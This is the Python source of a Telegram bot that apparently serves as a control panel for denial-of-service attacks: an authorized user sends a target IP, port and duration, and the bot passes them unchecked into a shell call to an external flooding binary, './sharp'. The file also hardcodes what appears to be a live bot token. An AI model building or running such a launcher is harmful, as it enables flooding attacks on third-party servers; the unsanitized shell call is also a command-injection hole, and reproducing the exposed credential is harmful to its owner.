import telebot
import logging
import time
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Configuration
AUTHORIZED_USER_ID = 1695959688  # Your authorized user ID
TOKEN = '7539022476:AAHz6HEujuVoyOyDIk50fqCN5mtjcyKHUwk'  # Your bot token
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Initialize bot and event loop
loop = asyncio.get_event_loop()
bot = telebot.TeleBot(TOKEN)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

def is_authorized(user_id):
    """Check if user is the authorized owner"""
    return user_id == AUTHORIZED_USER_ID

async def run_attack_command_async(target_ip, target_port, duration):
    """Execute the attack command asynchronously using ./sharp"""
    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 60")
    await process.communicate()

@bot.message_handler(commands=['attack'])
def attack_command(message):
    """Handle attack command"""
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔️ *Unauthorized access!*", parse_mode='Markdown')
        return

    bot.send_message(message.chat.id, 
                    "*Enter target in format:*\n`IP PORT TIME`\nExample: `1.1.1.1 80 120`", 
                    parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    """Process attack parameters"""
    try:
        if not is_authorized(message.from_user.id):
            return

        args = message.text.split()
        if len(args) != 3:
            bot.reply_to(message, "❌ *Invalid format! Use: IP PORT TIME*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]
        
        if target_port in blocked_ports:
            bot.reply_to(message, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.reply_to(message, 
                    f"💣 *Attack Launched!*\n\n"
                    f"IP: `{target_ip}`\n"
                    f"Port: `{target_port}`\n"
                    f"Duration: `{duration}s`", 
                    parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Attack error: {e}")
        bot.reply_to(message, "❌ *Invalid input! Please check parameters*", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle start command"""
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "🔒 *Access Denied*", parse_mode='Markdown')
        return

    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    buttons = [
        KeyboardButton("Launch Attack 💥"),
        KeyboardButton("System Status 📈"),
        KeyboardButton("Quick Help ❓")
    ]
    markup.add(*buttons)
    
    bot.send_message(message.chat.id,
                    "🛡️ *Authorized Access Granted*\n"
                    "Choose an option from the menu:",
                    reply_markup=markup,
                    parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    """Handle all other messages"""
    if not is_authorized(message.from_user.id):
        return

    if message.text == "Launch Attack 💥":
        attack_command(message)
    elif message.text == "System Status 📈":
        bot.reply_to(message, "🟢 *System Operational*\n🔄 Active Attacks: 0", parse_mode='Markdown')
    elif message.text == "Quick Help ❓":
        bot.reply_to(message, 
                    "⚙️ *Command Help:*\n"
                    "/attack - Start new attack\n"
                    "/start - Show main menu\n"
                    "💡 Format: `IP PORT TIME`", 
                    parse_mode='Markdown')

if __name__ == "__main__":
    logging.info("Starting private bot instance...")
    asyncio_thread = Thread(target=loop.run_forever, daemon=True)
    asyncio_thread.start()
    
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(10)